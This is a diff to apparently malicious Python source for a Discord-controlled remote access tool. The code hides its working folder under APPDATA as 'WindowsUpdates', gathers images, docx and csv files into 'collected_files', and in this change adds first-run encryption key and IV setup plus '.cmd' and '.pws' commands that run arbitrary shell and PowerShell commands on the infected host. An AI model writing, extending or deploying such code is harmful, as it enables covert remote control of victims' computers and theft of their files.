@@ -8,6 +8,7 @@ from shutil import copy;
 import base64
 import gzip
 import subprocess
+import json
 
 #TODO
 # - Add more commands
@@ -16,6 +17,10 @@ import subprocess
 
 modules_path = os.getcwd() + "\modules"
 client = discord.Client(intents=discord.Intents.all())
+
+#load config
+with open(f"config.json", "r") as f:
+        config = json.load(f)
 
 def load_modules():
     for module in os.listdir(modules_path):
@@ -45,6 +50,19 @@ async def on_ready():
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\images")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\docx")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\csv")
+
+    if not config.get("Helpers").get("did_run"):
+        try:
+            reg_h.create_enc_key()
+            reg_h.store_enc_key()
+            reg_h.create_iv()
+            reg_h.store_iv()
+            config["Helpers"]["did_run"] = True
+        except Exception as e:
+            print(e)
+            return
+    
+    
 
 @client.event
 async def on_message(message):
@@ -85,6 +103,8 @@ async def on_message(message):
         embed2.add_field(name=".createdir", value="Creates a specified directory. Usage: ``.createdir <folder_path>˙", inline=False)
         embed2.add_field(name=".networking", value="Gets networking information.", inline=False)
         embed2.add_field(name=".monitor", value="Turns the monitor on/off. Usage: ``.monitor <on/off>``", inline=False)
+        embed2.add_field(name=".cmd", value="Runs a command on the host computer. Usage: ``.cmd <command>``", inline=False)
+        embed2.add_field(name=".pws", value="Runs a powershell command on the host computer. Usage: ``.pws <command>``", inline=False)
         try:
             await message.channel.send(embed=embed)
             await message.channel.send(embed=embed2)
